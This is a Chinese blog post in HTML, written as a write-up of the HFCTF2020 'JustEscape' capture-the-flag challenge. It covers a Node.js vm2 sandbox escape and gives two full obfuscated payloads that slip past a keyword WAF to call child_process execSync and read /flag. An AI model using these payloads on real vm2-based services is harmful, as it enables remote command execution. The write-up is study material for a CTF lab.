@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+  
+  <title>第 五 周 write up [[HFCTF2020]JustEscape] - tothemoon &#39; s blog</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+  
+  
+
+  <link rel="shortcut icon" href="https://gitee.com/tothemoon_2020/picgo/raw/master/img/20201005095528.jpeg" type="image/png" />
+  <meta name="description" content="[HFCTF2020]JustEscape(VM沙箱逃逸)页面打开后有一堆相当于提示的东西：目录下肯定有个run.php，注意编码，真的是php嘛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第 五 周 write up [[HFCTF2020]JustEscape]">
+<meta property="og:url" content="http://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20[[HFCTF2020]JustEscape]/index.html">
+<meta property="og:site_name" content="tothemoon &#39; s blog">
+<meta property="og:description" content="[HFCTF2020]JustEscape(VM沙箱逃逸)页面打开后有一堆相当于提示的东西：目录下肯定有个run.php，注意编码，真的是php嘛">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021121242505.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021121455745.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021122541132.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021153123221.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021192944903.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021193000057.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021193723152.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021194120442.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021194519667.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021194805828.png">
+<meta property="og:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021195736157.png">
+<meta property="article:published_time" content="2020-10-21T12:06:32.000Z">
+<meta property="article:modified_time" content="2020-10-21T12:15:39.450Z">
+<meta property="article:author" content="tothemoon">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021121242505.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/gh/nexmoe/nexmoe.github.io@latest/css/style.css,npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css" crossorigin>
+  
+  <!--<link rel="stylesheet" href="/css/style.css?v=1603282587210">-->
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://gitee.com/tothemoon_2020/picgo/raw/master/img-ba40e8db67f132e43f5473e1bf736787.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tothemoon" class="mdui-btn mdui-btn-icon"><img src="https://gitee.com/tothemoon_2020/picgo/raw/master/20201016111730.png" alt="tothemoon"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="tothemoon">
+            <img src="https://gitee.com/tothemoon_2020/picgo/raw/master/20201016111730.png" alt="tothemoon" alt="tothemoon">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>5</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/archives" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        <form id="search_form" action_e="https://www.baidu.com/search?q=site:tothemoon2019.github.io" onsubmit="return search();">
+            <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+        </form>
+    </div>
+</div>
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/28841207" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/tothemoon2019" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(0，0，0);background-color: rgba(25,23,23,.1);">
+            <i class="nexmoefont icon-github"></i>
+        </a><a class="mdui-ripple" href="https://steamcommunity.com/profiles/76561198234182404/" target="_blank" mdui-tooltip="{content: 'steam'}" style="color: rgb(25, 23, 23);background-color: rgba(14,71,161,.1);">
+            <i class="nexmoefont icon-steam"></i>
+        </a><a class="mdui-ripple" href="https://www.zhihu.com/people/beezhu-zou" target="_blank" mdui-tooltip="{content: '知乎'}" style="color: color:#1e88e5;background-color: rgba(0, 0, 255, .15);">
+            <i class="nexmoefont icon-zhihu"></i>
+        </a><a class="mdui-ripple" href="https://blog.csdn.net/qq_43478096" target="_blank" mdui-tooltip="{content: 'csdn'}" style="color: color:#1e88e5;background-color: rgba(0, 0, 255, .15);">
+            <i class="nexmoefont https://csdnimg.cn/public/favicon.ico"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctf/">ctf</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/杂项/">杂项</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2020 tothemoon
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+  
+      <div class="nexmoe-post-cover" style="padding-bottom: 20%;"> 
+          <img data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/20201021201210.png" data-sizes="auto" alt="第 五 周 write up [[HFCTF2020]JustEscape]" class="lazyload">
+          <h1>第 五 周 write up [[HFCTF2020]JustEscape]</h1>
+      </div>
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年10月21日</a>
+    <a><i class="nexmoefont icon-areachart"></i>515 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
+</div>
+
+  <div class="nexmoe-post-right">
+    
+      <div class="nexmoe-fixed">
+        <div class="nexmoe-valign">
+            <div class="nexmoe-toc">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HFCTF2020-JustEscape-VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">[HFCTF2020]JustEscape(VM沙箱逃逸)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.2.</span> <span class="toc-text">0x01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.2.</span> <span class="toc-text">2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#success"><span class="toc-number">1.3.</span> <span class="toc-text">success</span></a></li></ol></li></ol>
+            </div>
+        </div>
+      </div>
+    
+  </div>
+
+  <article>
+    <h1 id="HFCTF2020-JustEscape-VM沙箱逃逸"><a href="#HFCTF2020-JustEscape-VM沙箱逃逸" class="headerlink" title="[HFCTF2020]JustEscape(VM沙箱逃逸)"></a>[HFCTF2020]JustEscape(VM沙箱逃逸)</h1><p>页面打开后有一堆相当于提示的东西：<code>目录下肯定有个run.php</code>，<code>注意编码</code>，<code>真的是php嘛</code><a id="more"></a></p>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021121242505.png" alt="image-20201021121242505" class="lazyload"></p>
+<p>打开run.php发现一段代码</p>
+<pre><code class="php">&lt;?php
+if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#39;code&#39; ] != NULL ) &#123;
+    $code = $_GET[&#39;code&#39;];
+    echo eval(code);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;</code></pre>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021121455745.png" alt="image-20201021121455745" class="lazyload"></p>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>其一注意编码：这里应该是将code后面的数学运算式经过url编码后才能正确运行。</p>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021122541132.png" alt="image-20201021122541132" class="lazyload"></p>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021153123221.png" alt="image-20201021122729516" class="lazyload"></p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>考虑到提示，又由于eval()函数不仅仅是php含有的，Node.js也有这个函数。于是用<code>Errot().stack</code>测试，页面回显了一堆错误报错。</p>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021192944903.png" alt="image-20201021192944903" class="lazyload"></p>
+<p>根据这些报错，应该可以确认是vm沙箱逃逸<br>在这里面有最新的沙箱逃逸的poc。<br><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a><br>但是直接用的话，应该会被waf拦截</p>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021193000057.png" alt="image-20201021193000057" class="lazyload"></p>
+<p>经过探测，发现wafu过滤掉了一下的关键字。</p>
+<pre><code>[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</code></pre>
+<p>这时可以利用一下两种方式绕过：</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>官方write up给出的是在关键字字母上加上 ` 比如：<img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021193723152.png" alt="image-20201021193723152" class="lazyload"></p>
+<p>然后将poc里的whoami改为cat /flag的url编码<img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021194120442.png" alt="image-20201021194120442" class="lazyload"></p>
+<p>payload:</p>
+<pre><code>/run.php?code=(()=%3E&#123;%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try&#123;%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20&#125;catch(e)&#123;%20return%20e[`a`](()=%3E&#123;&#125;)[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20&#125;%20&#125;)()</code></pre>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021194519667.png" alt="image-20201021194519667" class="lazyload"></p>
+<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>另一种方法是将关键字（比如prototyp）改为：<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code></p>
+<p>payload：</p>
+<pre><code>(function ()&#123;
+    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();
+    try&#123;
+        Object.preventExtensions(Buffer.from(``)).a = 1;
+    &#125;catch(e)&#123;
+        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();
+    &#125;
+&#125;)()</code></pre>
+<p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021194805828.png" alt="image-20201021194805763" class="lazyload"></p>
+<h2 id="success"><a href="#success" class="headerlink" title="success"></a>success</h2><p><img data-sizes="auto" data-src="https://gitee.com/tothemoon_2020/picgo/raw/master/image-20201021195736157.png" alt="image-20201021195736157" class="lazyload"></p>
+
+  </article>
+
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/ctf/">ctf</a>
+    
+    
+</div>
+
+  <div class="nexmoe-post-footer">
+    
+      
+  <div class="nexmoe-post-copyright">
+    <strong>本文作者：</strong>tothemoon<br>
+    <strong>本文链接：</strong><a href="http://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20[[HFCTF2020]JustEscape]/" title="http:&#x2F;&#x2F;tothemoon2019.github.io&#x2F;2020&#x2F;10&#x2F;21&#x2F;%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20[[HFCTF2020]JustEscape]&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;tothemoon2019.github.io&#x2F;2020&#x2F;10&#x2F;21&#x2F;%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20[[HFCTF2020]JustEscape]&#x2F;</a><br>
+    
+      <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+    
+  </div>
+
+
+    
+    <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+  </div>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js,gh/nexmoe/nexmoe.github.io@latest/js/app.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<!--<script src="/js/app.js?v=1603282587215"></script>-->
+
+
+    <script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
+
+
+
+  
+
+
+
+
+
+</body>
+
+</html>
